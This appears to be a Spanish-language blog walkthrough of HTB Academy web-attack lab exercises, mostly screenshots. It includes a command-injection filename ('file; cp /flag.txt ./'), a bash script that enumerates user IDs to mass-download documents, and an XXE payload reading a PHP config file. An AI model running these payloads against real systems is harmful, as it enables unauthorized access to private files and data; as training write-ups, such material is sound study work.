---
layout: post
title: "Walkthrough: Web Attacks"
date:  24-02-2026
categories: [Walkthroughs, HTB Academy]
tags: [SQL, SQL Injections]
image: "assets/images/HTB_Academy_Web_Attacks/featured_image.png"
alt: portada de Walkthrough Web Attacks
---
# Web Attacks

## HTTP Verb Tampering

### Bypassing Basic Authentication

**Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.**

94.237.55.96:57486

Realizo un ping a la ip de la maquina objetivo ping -c2 94.237.55.96

![alt text](../assets/images/HTB_Academy_Web_Attacks/image.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-1.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-3.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-2.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-4.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-5.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-6.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-7.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-8.png)

Recargo la web de nuevo para ver si surtio efecto el cambio de metodo.

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-9.png)

### Bypassing Security Filters

**To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./**


83.136.249.104:34827

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-10.png)

In the File Manager web application, if we try to create a new file name with special characters in its name (e.g. test;), we get the following message:

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-11.png)


 let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method:


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-12.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-13.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-14.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-15.png)

Hago lo mismo para "file; cp /flag.txt ./"

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-16.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-17.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-18.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-19.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-20.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-21.png)


## Insecure Direct Object References (IDOR)

### Mass IDOR Enumeration

**Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**

94.237.48.35:46523

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-22.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-23.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-25.png)


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-26.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-27.png)


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-28.png)

Cambio uid=2 

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-30.png)

Obtengo los documentos para el uid=2

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-29.png)

Inspecciono la pagina

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-31.png)

```html
<li class="pure-tree_link">
    <a href="/documents/Invoice_2_08_2020.pdf" target="_blank">Invoice</a>
</li>
```

Puedo hacer un curl al servidor y filtrar por <li class="pure-tree_link"> para obtener la lista de los enlaces.

```sh
curl -s -X $'POST' -H $'Host: 94.237.48.35:46523' --data-binary $'uid=1' $'http://94.237.48.35:46523/documents.php' | grep "<li class='pure-tree_link'>"
```

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-32.png)

Si voy cambiando el valor de uid obtengo los nombres de los ficheros en el listado para cada uid

```sh
curl -s -X $'POST' -H $'Host: 94.237.48.35:46523' --data-binary $'uid=1' $'http://94.237.48.35:46523/documents.php' | grep "<li class='pure-tree_link'>"
curl -s -X $'POST' -H $'Host: 94.237.48.35:46523' --data-binary $'uid=2' $'http://94.237.48.35:46523/documents.php' | grep "<li class='pure-tree_link'>"
curl -s -X $'POST' -H $'Host: 94.237.48.35:46523' --data-binary $'uid=3' $'http://94.237.48.35:46523/documents.php' | grep "<li class='pure-tree_link'>"
```

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-33.png)


```sh
mkdir mass_idor
cd mass_idor/
touch i_am_mass_idor.sh
nano i_am_mass_idor.sh 
```

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-35.png)

Creo el siguiente script 


```sh
#!/bin/bash

# Configuración del servidor y endpoint
host="94.237.48.35:46523"
url="http://$host/documents.php"

# Iterar sobre los valores de uid de 1 a 20
for i in {1..20}; do
    echo "[+] Enviando solicitud para UID: $i"

    # Realizar la solicitud POST y extraer los enlaces de cualquier tipo de archivo
    links=$(curl -s -X POST -H "Host: $host" --data-binary "uid=$i" "$url" | 
        grep -oP '(?<=href=\x27|href=\x22)/documents/[^"'\'' ]+' | 
        sed "s/^/'/" | awk -F"'" '{print $2}')

    if [[ -z "$links" ]]; then
        echo "[-] No se encontraron archivos para UID: $i"
        continue
    fi

    # Descargar los archivos encontrados
    for link in $links; do
        full_url="http://$host$link"
        echo "[+] Descargando: $full_url"
        wget -q "$full_url" || echo "[!] Error descargando $full_url"
    done
done

echo "[+] Descargas completadas."

```

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-34.png)

Cambio los permisos para otorgarle ejecucion

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-36.png)

Ejecuto el script

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-37.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-38.png)

Observo que uno  de los ficheros no es un pdf sino un txt: `flag_11dfa168ac8eb2958e38425728623c98.txt`

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-39.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-40.png)

### Bypassing Encoded References

**Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-41.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-42.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-43.png)

/download.php?contract=MQ%3D%3D

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-45.png)

Decodifico como URL y luego como Base64 y obtengo que el valor codificado es 1

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-44.png)


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-46.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-47.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-48.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-49.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-50.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-51.png)


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-52.png)


### IDOR in Insecure APIs

**Try to read the details of the user with 'uid=5'. What is their 'uuid' value?**


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-53.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-59.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-54.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-55.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-60.png)

Capturo la peticion y modifico el valor de profile de 1 a 5 y obtengo el perfil 5

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-56.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-57.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-61.png)

### Chaining IDOR Vulnerabilities

**Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.**


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-64.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-65.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-67.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-66.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-68.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-69.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-70.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-71.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-72.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-73.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-74.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-75.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-76.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-77.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-78.png)

## XML External Entity (XXE) Injection

### Local File Disclosure

**Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.**

10.129.244.71


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-79.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-80.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-81.png)

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-84.png)


![alt text](../assets/images/HTB_Academy_Web_Attacks/image-85.png)

**Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.**

94.237.57.157:58007
Authenticate to 94.237.57.157:58007 with user "htb-student" and password "Academy_student!"



![alt text](../assets/images/HTB_Academy_Web_Attacks/image-87.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-86.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-88.png)

![alt text](../assets/images/HTB_Academy_Web_Attacks/image-89.png)
